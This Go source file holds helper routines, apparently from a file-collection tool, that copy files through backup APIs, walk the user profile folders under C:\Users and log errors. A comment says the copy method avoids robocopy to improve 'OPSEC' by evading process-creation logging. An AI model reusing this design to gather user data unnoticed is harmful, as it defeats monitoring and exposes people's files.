package modules

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// copyNative copies files matching pattern from srcDir to dstDir using native Backup APIs.
// This avoids calling `robocopy.exe`, improving OPSEC by avoiding Process Creation events.
func copyNative(ctx context.Context, srcDir, patternStr, dstDir string) error {
	if err := os.MkdirAll(dstDir, 0755); err != nil {
		return fmt.Errorf("failed to create dest dir %s: %w", dstDir, err)
	}

	entries, err := os.ReadDir(srcDir)
	if err != nil {
		return fmt.Errorf("failed to read srcDir %s: %w", srcDir, err)
	}

	var hasMatched bool
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		matched, _ := filepath.Match(patternStr, entry.Name())
		if matched {
			hasMatched = true
			srcPath := filepath.Join(srcDir, entry.Name())
			dstPath := filepath.Join(dstDir, entry.Name())
			err := CopyFileNativeBackup(ctx, srcPath, dstPath)
			if err != nil {
				// We log or ignore individual file errors to continue copying
				_ = err
			}
		}
	}
	if !hasMatched {
		return fmt.Errorf("no files matched %s in %s", patternStr, srcDir)
	}
	return nil
}

// copyNativeRecursive recursively copies srcDir tree into dstDir using native Backup APIs.
func copyNativeRecursive(ctx context.Context, srcDir, dstDir string) error {
	if err := os.MkdirAll(dstDir, 0755); err != nil {
		return fmt.Errorf("failed to create dest dir %s: %w", dstDir, err)
	}

	return filepath.Walk(srcDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Skip files we cannot even stat. Walk continues.
		}
		if ctx.Err() != nil {
			return ctx.Err()
		}

		rel, err := filepath.Rel(srcDir, path)
		if err != nil {
			return nil
		}

		dstPath := filepath.Join(dstDir, rel)
		if info.IsDir() {
			_ = os.MkdirAll(dstPath, 0755)
			return nil
		}

		_ = CopyFileNativeBackup(ctx, path, dstPath)
		return nil
	})
}

// getUserProfileDirs returns full paths of user home directories under C:\Users,
// excluding system accounts (Public, Default, Default User, All Users).
func getUserProfileDirs(ctx context.Context) ([]string, error) {
	usersDir := `C:\Users`
	entries, err := os.ReadDir(usersDir)
	if err != nil {
		return nil, fmt.Errorf("failed to enumerate user profiles: %w", err)
	}

	var dirs []string
	excluded := map[string]bool{
		"Public":       true,
		"Default":      true,
		"Default User": true,
		"All Users":    true,
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		if excluded[entry.Name()] {
			continue
		}
		dirs = append(dirs, filepath.Join(usersDir, entry.Name()))
	}
	return dirs, nil
}

// profileName returns the username portion of a profile directory path.
func profileName(profileDir string) string {
	return filepath.Base(profileDir)
}

// writeErrors writes a multi-line error summary to a file without aborting the module.
func writeErrors(outputDir string, errs []string) {
	if len(errs) == 0 {
		return
	}
	_ = os.MkdirAll(outputDir, 0755)
	_ = os.WriteFile(filepath.Join(outputDir, "errors.txt"), []byte(strings.Join(errs, "\n")), 0644)
}
